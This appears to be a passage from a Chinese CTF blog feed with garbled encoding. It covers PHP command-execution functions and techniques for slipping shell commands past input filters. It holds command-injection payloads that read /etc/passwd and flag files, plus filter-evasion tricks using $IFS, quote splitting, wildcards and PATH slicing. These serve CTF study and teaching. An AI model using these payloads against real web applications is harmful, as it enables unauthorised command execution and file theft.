class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">WhiteGod</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:_unset-&gt;CTF</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:end-&gt;Handle</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:_call-&gt;Super</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:_invoke-&gt;Then</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:toString-&gt;Begin</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:__destruct</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>åŸºç¡€çŸ¥è¯†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>phpååºåˆ—åŒ–</tag>
      
      <tag>popé“¾æ„é€ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCEï¼ˆä»»æ„å‘½ä»¤æ‰§è¡Œï¼‰ç»•è¿‡</title>
    <link href="/2025/04/06/RCE%EF%BC%88%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E7%BB%95%E8%BF%87/"/>
    <url>/2025/04/06/RCE%EF%BC%88%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="RCEï¼ˆä»»æ„å‘½ä»¤æ‰§è¡Œï¼‰ç»•è¿‡"><a href="#RCEï¼ˆä»»æ„å‘½ä»¤æ‰§è¡Œï¼‰ç»•è¿‡" class="headerlink" title="RCEï¼ˆä»»æ„å‘½ä»¤æ‰§è¡Œï¼‰ç»•è¿‡"></a>RCEï¼ˆä»»æ„å‘½ä»¤æ‰§è¡Œï¼‰ç»•è¿‡</h1><h2 id="æ“ä½œç³»ç»Ÿè¿æ¥ç¬¦"><a href="#æ“ä½œç³»ç»Ÿè¿æ¥ç¬¦" class="headerlink" title="æ“ä½œç³»ç»Ÿè¿æ¥ç¬¦"></a>æ“ä½œç³»ç»Ÿè¿æ¥ç¬¦</h2><p>åˆ†å·ï¼›ï¼šå¤šä¸ªå‘½ä»¤æ— è®ºå¯¹é”™é¡ºåºæ‰§è¡Œ</p><p>&amp;&amp;ï¼šå‰é¢å‘½ä»¤æ‰§è¡Œä¸æˆåŠŸåé¢å‘½ä»¤æ— æ³•æ‰§è¡Œ</p><p>&amp;ï¼šç”¨äºä¾æ¬¡æ‰§è¡Œå¤šä¸ªå‘½ä»¤ï¼Œæ— è®ºå‰ä¸€ä¸ªå‘½ä»¤æ˜¯å¦æˆåŠŸã€‚</p><p>ç®¡é“è¾“å‡ºç¬¦|ï¼šå‰é¢å‘½ä»¤çš„è¾“å‡ºä½œä¸ºåé¢å‘½ä»¤çš„è¾“å…¥ï¼ŒæŠŠå‰é¢å‘½ä»¤çš„ç»“æœä½œä¸ºåé¢å‘½ä»¤çš„å‚æ•°;å‰é¢åé¢çš„å‘½ä»¤éƒ½æ‰§è¡Œï¼Œä½†æ˜¯åªæ˜¾ç¤ºåé¢çš„å‘½ä»¤æ‰§è¡Œç»“æœã€‚</p><p>||ï¼šå‰é¢çš„å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œåˆ™åé¢çš„å‘½ä»¤ä¸ä¼šæ‰§è¡Œï¼›å‰é¢çš„å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œåˆ™åé¢çš„å‘½ä»¤æ‰§è¡Œ</p><h2 id="ç¨‹åºæ‰§è¡Œå‡½æ•°"><a href="#ç¨‹åºæ‰§è¡Œå‡½æ•°" class="headerlink" title="ç¨‹åºæ‰§è¡Œå‡½æ•°"></a>ç¨‹åºæ‰§è¡Œå‡½æ•°</h2><p>os.system()</p><p>subprocess.Popen()</p><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p><strong>ç¤ºä¾‹exec(â€œcat &#x2F;flagâ€)</strong></p><p>exec(<a href="https://www.php.net/manual/zh/language.types.string.php">string</a> <code>$command</code>, <a href="https://www.php.net/manual/zh/language.types.array.php">array</a> <code>&amp;$output</code> &#x3D; <strong><code>null</code></strong>, <a href="https://www.php.net/manual/zh/language.types.integer.php">int</a> <code>&amp;$result_code</code> &#x3D; <strong><code>null</code></strong>): <a href="https://www.php.net/manual/zh/language.types.string.php">string</a>|<a href="https://www.php.net/manual/zh/language.types.value.php">false</a></p><p>exec() æ‰§è¡Œ <code>command</code> å‚æ•°æ‰€æŒ‡å®šçš„å‘½ä»¤ã€‚</p><p>å¦‚æœæä¾›äº† <code>output</code> å‚æ•°ï¼Œ é‚£ä¹ˆä¼šç”¨å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºå¡«å……æ­¤æ•°ç»„ï¼Œ æ¯è¡Œè¾“å‡ºå¡«å……æ•°ç»„ä¸­çš„ä¸€ä¸ªå…ƒç´ ã€‚</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">exec</span>()` å‡½æ•°ç”¨äºæ‰§è¡Œ shell å‘½ä»¤ï¼Œä½†ä¸ä¼šç›´æ¥è¾“å‡ºæ‰§è¡Œç»“æœï¼Œå®ƒçš„è¿”å›å€¼åªæ˜¯å‘½ä»¤çš„æœ€åä¸€è¡Œè¾“å‡ºï¼Œè€Œä¸æ˜¯å®Œæ•´çš„è¾“å‡ºã€‚å¦‚æœä½ éœ€è¦å®Œæ•´çš„æ‰§è¡Œç»“æœï¼Œå¯ä»¥ä½¿ç”¨ `<span class="hljs-built_in">exec</span>()` çš„ç¬¬äºŒä¸ªå‚æ•°æˆ– `<span class="hljs-built_in">shell_exec</span>()<br></code></pre></td></tr></table></figure><p>è¿”å›å€¼</p><p>å‘½ä»¤æ‰§è¡Œç»“æœçš„æœ€åä¸€è¡Œå†…å®¹ã€‚</p><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h3><p>shell_exec â€” é€šè¿‡ shell æ‰§è¡Œå‘½ä»¤å¹¶å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›</p><p>ç¤ºä¾‹ï¼š<strong>shell_execï¼ˆlsï¼‰</strong>  shell_exec(ls | tee 1.txt)</p><p>ä¸èƒ½è‡ªå·±å›æ˜¾ï¼Œéœ€è¦print_rç­‰è¾“å‡ºå†…å®¹</p><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><p>æ‰§è¡Œå¤–éƒ¨ç¨‹åºï¼Œå¹¶ä¸”æ˜¾ç¤ºè¾“å‡º</p><p>ç¤ºä¾‹ï¼š<strong>systemï¼ˆâ€™lsâ€™ï¼‰</strong></p><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h3><p>åŒ <a href="https://www.php.net/manual/zh/function.exec.php">exec()</a> å‡½æ•°ç±»ä¼¼ï¼Œ <strong>passthru()</strong> å‡½æ•° ä¹Ÿæ˜¯ç”¨æ¥æ‰§è¡Œå¤–éƒ¨å‘½ä»¤çš„ã€‚ </p><p>æƒ³è®© <code>passthru()</code> <strong>ç›´æ¥è¾“å‡ºåˆ°ç½‘é¡µï¼ŒåŒæ—¶å­˜å…¥å˜é‡</strong>ï¼Œå¯ä»¥ç”¨ <code>tee</code> å‘½ä»¤ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">passthru(<span class="hljs-string">&quot;ls | tee temp.txt&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>ä¸èƒ½è‡ªå·±å›æ˜¾ï¼Œéœ€è¦print_rç­‰è¾“å‡ºå†…å®¹</p><h3 id="backticks-åå¼•å·"><a href="#backticks-åå¼•å·" class="headerlink" title="backticks(åå¼•å·)"></a>backticks(åå¼•å·)</h3><p>å’Œ <code>shell_exec()</code> ç±»ä¼¼ï¼Œè¿”å›å®Œæ•´çš„å‘½ä»¤è¾“å‡ºã€‚</p><p>ç¤ºä¾‹ï¼šâ€™lsâ€™ </p><p>ä¸èƒ½è‡ªå·±å›æ˜¾ï¼Œéœ€è¦print_rç­‰è¾“å‡ºå†…å®¹</p><h3 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$handle</span> = popen(<span class="hljs-string">&quot;ls&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);| <span class="hljs-built_in">echo</span> stream_get_contents(<span class="hljs-variable">$handle</span>);<br></code></pre></td></tr></table></figure><p>ä¸èƒ½è‡ªå·±å›æ˜¾ï¼Œéœ€è¦print_rç­‰è¾“å‡ºå†…å®¹</p><h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h3><p>è¯­æ³•:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">proc_open</span><span class="hljs-params">(<span class="hljs-variable">$command</span>,<span class="hljs-variable">$descriptorspec</span>,<span class="hljs-variable">$pipes</span>,<span class="hljs-variable">$cwd</span>,<span class="hljs-variable">$env</span> vars,<span class="hljs-variable">$options</span>)</span></span>,<br></code></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$command</span>æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</span><br><span class="hljs-meta"><span class="hljs-keyword">$descriptorspec</span>æ˜¯ä¸€ä¸ªæè¿°ç¬¦è§„èŒƒæ•°ç»„ï¼Œç”¨äºæŒ‡å®šè¿›ç¨‹çš„è¾“å…¥ã€è¾“å‡ºå’Œé”™è¯¯çš„æ–‡ä»¶æè¿°ç¬¦ã€‚</span><br><span class="hljs-meta"><span class="hljs-keyword">$pipes</span>æ˜¯ä¸€ä¸ªå¼•ç”¨å˜é‡ï¼Œç”¨äºå­˜å‚¨ä¸è¿›ç¨‹ç›¸å…³çš„ç®¡é“ã€‚</span><br><span class="hljs-meta"><span class="hljs-keyword">$cwd</span>ï¼ˆå¯é€‰ï¼‰æ˜¯è®¾ç½®å­è¿›ç¨‹çš„å½“å‰å·¥ä½œç›®å½•ã€‚</span><br><span class="hljs-meta"><span class="hljs-keyword">$env</span>ï¼ˆå¯é€‰ï¼‰æ˜¯è®¾ç½®å­è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ã€‚</span><br><span class="hljs-meta"><span class="hljs-keyword">$other</span>_optionsï¼ˆå¯é€‰ï¼‰æ˜¯å…¶ä»–é€‰é¡¹ï¼Œå¦‚è®¾ç½®è¶…æ—¶ç­‰ã€‚</span><br></code></pre></td></tr></table></figure><p><code>proc_open(&quot;ls&quot;)</code> <strong>ä¸èƒ½ç›´æ¥è¾“å‡ºå‘½ä»¤æ‰§è¡Œç»“æœ</strong>ï¼Œéœ€è¦æ‰‹åŠ¨è¯»å– <code>pipes[1]</code> å¹¶ <code>echo</code> é€è¡Œè¾“å‡ºï¼Œä½¿å…¶<strong>è¾¾åˆ° <code>system(&quot;ls&quot;)</code> æˆ– <code>passthru(&quot;ls&quot;)</code> çš„æ•ˆæœ</strong>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$descriptorspec</span> = [<br>    <span class="hljs-number">1</span> =&gt; [<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>],  <span class="hljs-comment">// æ ‡å‡†è¾“å‡ºï¼ˆå¯è¯»ï¼‰</span><br>    <span class="hljs-number">2</span> =&gt; [<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>]   <span class="hljs-comment">// æ ‡å‡†é”™è¯¯ï¼ˆå¯è¯»ï¼‰</span><br>];<br><br><span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-string">&quot;ls&quot;</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$process</span>)) &#123;<br>    <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]); <span class="hljs-comment">// é€è¡Œè¯»å–å¹¶è¾“å‡º</span><br>        <span class="hljs-title function_ invoke__">flush</span>();<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);<br>    <span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$process</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å–å"><a href="#å–å" class="headerlink" title="~å–å"></a>~å–å</h3><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-24_21-34-22.png" alt="PixPin_2025-03-24_21-34-22"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-24_21-38-16.png" alt="PixPin_2025-03-24_21-38-16"></p><h2 id="è¢«è¿‡æ»¤"><a href="#è¢«è¿‡æ»¤" class="headerlink" title="&#x2F; è¢«è¿‡æ»¤"></a>&#x2F; è¢«è¿‡æ»¤</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span>&#123;<span class="hljs-variable">$IFS</span>&#125;-al<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> <span class="hljs-string">..</span>%26%26 <span class="hljs-string">..</span>%26%26<span class="hljs-keyword">cd</span> <span class="hljs-string">..</span>&amp;&amp;<span class="hljs-keyword">pwd</span><br></code></pre></td></tr></table></figure><h2 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h2><h3 id="å¤§æ‹¬å·-é‡Œæ— ç©ºæ ¼"><a href="#å¤§æ‹¬å·-é‡Œæ— ç©ºæ ¼" class="headerlink" title="å¤§æ‹¬å·{ }é‡Œæ— ç©ºæ ¼"></a>å¤§æ‹¬å·{ }é‡Œæ— ç©ºæ ¼</h3><p>{cat,flag.php}</p><h3 id="IFS"><a href="#IFS" class="headerlink" title="$IFS"></a>$IFS</h3><p>$IFS$9  </p><p>${IFS} </p><h3 id="09ç»•è¿‡"><a href="#09ç»•è¿‡" class="headerlink" title="%09ç»•è¿‡"></a>%09ç»•è¿‡</h3><h3 id="é‡å®šå‘å­—ç¬¦"><a href="#é‡å®šå‘å­—ç¬¦" class="headerlink" title="é‡å®šå‘å­—ç¬¦&lt;ï¼Œ&lt;&gt;"></a><a href="https://so.csdn.net/so/search?q=%E9%87%8D%E5%AE%9A%E5%90%91&spm=1001.2101.3001.7020">é‡å®šå‘</a>å­—ç¬¦&lt;ï¼Œ&lt;&gt;</h3><ol><li><p>åœ¨æŸäº›ç¯å¢ƒä¸‹ï¼Œ<code>&lt;</code> å’Œ <code>&gt;</code> å¯ä»¥åœ¨ç‰¹å®šæƒ…å†µä¸‹å……å½“ç©ºæ ¼çš„ä½œç”¨ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span>&lt;flag<br></code></pre></td></tr></table></figure></li><li></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span>&gt;<span class="hljs-variable">$&#123;PWD&#125;</span>/test<br></code></pre></td></tr></table></figure><p>ç­‰ä»·äº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> &gt; <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><h3 id="åˆ©ç”¨-echo-å‘½ä»¤æ›¿æ¢"><a href="#åˆ©ç”¨-echo-å‘½ä»¤æ›¿æ¢" class="headerlink" title="åˆ©ç”¨ $(echo) å‘½ä»¤æ›¿æ¢"></a>åˆ©ç”¨ <code>$(echo)</code> å‘½ä»¤æ›¿æ¢</h3><p><code>$(command)</code> è¯­æ³•åœ¨ Bash ä¸­ä¼šæ‰§è¡Œ <code>command</code> å¹¶ç”¨å…¶è¾“å‡ºæ›¿æ¢è¯¥è¯­æ³•ã€‚å› æ­¤ï¼Œå¯ä»¥ç”¨ <code>echo</code> ç”Ÿæˆä¸€ä¸ªç©ºæ ¼ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span>$(<span class="hljs-built_in">echo</span>)/etc/passwd<br></code></pre></td></tr></table></figure><h3 id="ï¼›"><a href="#ï¼›" class="headerlink" title="ï¼›"></a>ï¼›</h3><p>ls;cat flag</p><h2 id="æ–‡ä»¶åè¿‡æ»¤ç»•è¿‡"><a href="#æ–‡ä»¶åè¿‡æ»¤ç»•è¿‡" class="headerlink" title="æ–‡ä»¶åè¿‡æ»¤ç»•è¿‡"></a>æ–‡ä»¶åè¿‡æ»¤ç»•è¿‡</h2><h3 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h3><h3 id="é€šé…ç¬¦-ç»•è¿‡"><a href="#é€šé…ç¬¦-ç»•è¿‡" class="headerlink" title="é€šé…ç¬¦??,*ç»•è¿‡"></a>é€šé…ç¬¦??,*ç»•è¿‡</h3><blockquote><p>cat &#x2F;fl??</p></blockquote><blockquote><p>cat &#x2F;f* </p></blockquote><h3 id="å•å¼•å·-â€˜-åŒå¼•å·-â€œâ€-åå¼•å·-ç»•è¿‡æ­£åˆ™"><a href="#å•å¼•å·-â€˜-åŒå¼•å·-â€œâ€-åå¼•å·-ç»•è¿‡æ­£åˆ™" class="headerlink" title="å•å¼•å·(â€˜)åŒå¼•å·(â€œâ€)åå¼•å·(&#96;&#96;)ç»•è¿‡æ­£åˆ™"></a>å•å¼•å·(â€˜)åŒå¼•å·(â€œâ€)åå¼•å·(&#96;&#96;)ç»•è¿‡æ­£åˆ™</h3><blockquote><p>cat &#x2F;flâ€â€ag</p></blockquote><blockquote><p>câ€â€at &#x2F;eâ€™tâ€™c&#x2F;pas<code>s</code>wd </p></blockquote><p>å¤–é¢åŒ…è£¹çš„æ˜¯å•å¼•å·é‡Œé¢å°±æ˜¯åŒå¼•å·ï¼Œå¤–é¢åŒ…è£¹çš„æ˜¯åŒå¼•å·é‡Œé¢å°±æ˜¯å•å¼•å·ï¼Œæˆ–è€…ç”¨æ–œçº¿\å»æ‰åŠŸèƒ½æ€§ï¼Œé¿å…æŠ¥é”™</p><blockquote><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">passthru</span>(<span class="hljs-string">&#x27;cat /fl&quot;&quot;ag.p\&#x27;</span>\<span class="hljs-string">&#x27;hp&#x27;</span>)</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="åæ–œæ -ç»•è¿‡"><a href="#åæ–œæ -ç»•è¿‡" class="headerlink" title="åæ–œæ \ç»•è¿‡"></a>åæ–œæ \ç»•è¿‡</h3><h3 id="ä½ç½®å‚æ•°ç‰¹æ®Šå˜é‡ï¼š-1åˆ°-9ã€-å’Œ"><a href="#ä½ç½®å‚æ•°ç‰¹æ®Šå˜é‡ï¼š-1åˆ°-9ã€-å’Œ" class="headerlink" title="ä½ç½®å‚æ•°ç‰¹æ®Šå˜é‡ï¼š$1åˆ°$9ã€$@å’Œ$*"></a>ä½ç½®å‚æ•°ç‰¹æ®Šå˜é‡ï¼š$1åˆ°$9ã€$@å’Œ$*</h3><p>æˆ–è€…åœ¨å•è¯ç»“å°¾å¤„æ’å…¥$xï¼Œè¿™é‡Œçš„xå¯ä»¥æ˜¯ä»»æ„å­—æ¯ï¼Œä¾‹å¦‚å¯ä»¥å†™æˆå¦‚ä¸‹å½¢å¼ï¼š</p><blockquote><p>c$@at &#x2F;e$@tc&#x2F;pas$@swd</p><p>cat$x &#x2F;etc$x&#x2F;passwd$x</p><p>ca$@t &#x2F;etc$x&#x2F;passwd$x</p></blockquote><h3 id="å†…è”æ‰§è¡Œç»•è¿‡"><a href="#å†…è”æ‰§è¡Œç»•è¿‡" class="headerlink" title="å†…è”æ‰§è¡Œç»•è¿‡"></a>å†…è”æ‰§è¡Œç»•è¿‡</h3><p>a&#x3D;c;b&#x3D;a;c&#x3D;t;$a$b$c &#x2F;1.txt</p><p>a&#x3D;f;c&#x3D;a;d&#x3D;g;b&#x3D;l;cat $a$b$c$d.phpï¼ˆabcdæ‹¼æ¥å‡ºæ¥flagï¼‰</p><h3 id="åˆ©ç”¨linuxä¸­çš„ç¯å¢ƒå˜é‡"><a href="#åˆ©ç”¨linuxä¸­çš„ç¯å¢ƒå˜é‡" class="headerlink" title="åˆ©ç”¨linuxä¸­çš„ç¯å¢ƒå˜é‡"></a>åˆ©ç”¨linuxä¸­çš„ç¯å¢ƒå˜é‡</h3><p>ä½¿ç”¨ç¯å¢ƒå˜é‡é‡Œçš„å­—ç¬¦æ‰§è¡Œå˜é‡</p><p>echo $PATH              #PATHé»˜è®¤ç³»ç»Ÿç¯å¢ƒå˜é‡</p><p>å¦‚æœå‡ºç°ï¼š</p><p>&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;snap&#x2F;bin</p><p>echo f${PATH:5:1}${PATH:8:1}${PATH:66:1}.${PATH:93:1}h${PATH:93:1}<br>è¡¨ç¤ºäº†flag.php</p><p>æ¯”å¦‚${PATH:5:1}æŒ‡çš„æ˜¯å–è·¯å¾„çš„ç¬¬äº”ä½ï¼ˆä»0å¼€å§‹æ•°ï¼Œç¬¬0ä½æ˜¯&#x2F;ï¼‰çš„å­—ç¬¦ï¼Œæ­¥é•¿ä¸º1ï¼Œå³åªå–ä¸€ä¸ªå­—æ¯lï¼Œä»¥æ­¤ç±»æ¨å°±èƒ½æ‹¼æ¥æˆå…³é”®å­—flag.php</p><h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><h2 id="è¯»å–å‘½ä»¤ç»•è¿‡"><a href="#è¯»å–å‘½ä»¤ç»•è¿‡" class="headerlink" title="è¯»å–å‘½ä»¤ç»•è¿‡"></a>è¯»å–å‘½ä»¤ç»•è¿‡</h2><h3 id="head"><a href="#head" class="headerlink" title="head"></a>head</h3><h3 id="ä½¿ç”¨-vi-vim-è¯»å–æ–‡ä»¶"><a href="#ä½¿ç”¨-vi-vim-è¯»å–æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨ vi&#x2F;vim è¯»å–æ–‡ä»¶"></a>ä½¿ç”¨ <code>vi</code>&#x2F;<code>vim</code> è¯»å–æ–‡ä»¶</h3><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">vi <span class="hljs-keyword">filename</span><br><br>vim <span class="hljs-keyword">filename</span><br></code></pre></td></tr></table></figure><p>æˆ–è€…ä»¥åªè¯»æ¨¡å¼æ‰“å¼€æ–‡ä»¶<br>å¯ä»¥ç”¨ <strong>view</strong>ï¼ˆVim å†…ç½®çš„åªè¯»æ¨¡å¼ï¼‰ï¼š</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">view</span> <span class="hljs-keyword">filename</span><br>vim -R <span class="hljs-keyword">filename</span><br>//è¿™æ · vim ä¼šä»¥ åªè¯»æ¨¡å¼ æ‰“å¼€æ–‡ä»¶ï¼Œé˜²æ­¢è¯¯æ“ä½œã€‚<br></code></pre></td></tr></table></figure><h3 id="tac-åå‘æ˜¾ç¤ºï¼Œä»æœ€åä¸€è¡Œå¼€å§‹å¾€å‰æ˜¾ç¤º"><a href="#tac-åå‘æ˜¾ç¤ºï¼Œä»æœ€åä¸€è¡Œå¼€å§‹å¾€å‰æ˜¾ç¤º" class="headerlink" title="tac:åå‘æ˜¾ç¤ºï¼Œä»æœ€åä¸€è¡Œå¼€å§‹å¾€å‰æ˜¾ç¤º"></a>tac:åå‘æ˜¾ç¤ºï¼Œä»æœ€åä¸€è¡Œå¼€å§‹å¾€å‰æ˜¾ç¤º</h3><blockquote><p>tac &#x2F;flag</p></blockquote><h3 id="more-ä¸€é¡µä¸€é¡µæ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹"><a href="#more-ä¸€é¡µä¸€é¡µæ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹" class="headerlink" title="more:ä¸€é¡µä¸€é¡µæ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹"></a>more:ä¸€é¡µä¸€é¡µæ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹</h3><blockquote><p>more flag.php</p></blockquote><h3 id="lessï¼šä¸moreç±»ä¼¼"><a href="#lessï¼šä¸moreç±»ä¼¼" class="headerlink" title="lessï¼šä¸moreç±»ä¼¼"></a>lessï¼šä¸moreç±»ä¼¼</h3><h3 id="tailï¼šæŸ¥çœ‹æœ«å°¾å‡ è¡Œ"><a href="#tailï¼šæŸ¥çœ‹æœ«å°¾å‡ è¡Œ" class="headerlink" title="tailï¼šæŸ¥çœ‹æœ«å°¾å‡ è¡Œ"></a>tailï¼šæŸ¥çœ‹æœ«å°¾å‡ è¡Œ</h3><h3 id="nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·"><a href="#nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·" class="headerlink" title="nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·"></a>nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·</h3><blockquote><p>nl &#x2F;flag</p></blockquote><p>nl flag :å½“å‰ç›®å½•ä¸‹æŸ¥æ‰¾flag</p><h3 id="odï¼šä»¥äºŒè¿›åˆ¶æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹ã€‚æ­£å¸¸çš„od-flagè¾“å‡ºçš„çº¯çº¯äºŒè¿›åˆ¶"><a href="#odï¼šä»¥äºŒè¿›åˆ¶æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹ã€‚æ­£å¸¸çš„od-flagè¾“å‡ºçš„çº¯çº¯äºŒè¿›åˆ¶" class="headerlink" title="odï¼šä»¥äºŒè¿›åˆ¶æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹ã€‚æ­£å¸¸çš„od &#x2F;flagè¾“å‡ºçš„çº¯çº¯äºŒè¿›åˆ¶"></a>odï¼šä»¥äºŒè¿›åˆ¶æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹ã€‚æ­£å¸¸çš„od &#x2F;flagè¾“å‡ºçš„çº¯çº¯äºŒè¿›åˆ¶</h3><p>æƒ³çœ‹åˆ°æ–‡ä»¶å†…å®¹éœ€è¦ï¼š</p><p>passthru(â€œod -A d -c &#x2F;fla\gâ€);</p><h3 id="xxdï¼šè¯»å–äºŒè¿›åˆ¶æ–‡ä»¶"><a href="#xxdï¼šè¯»å–äºŒè¿›åˆ¶æ–‡ä»¶" class="headerlink" 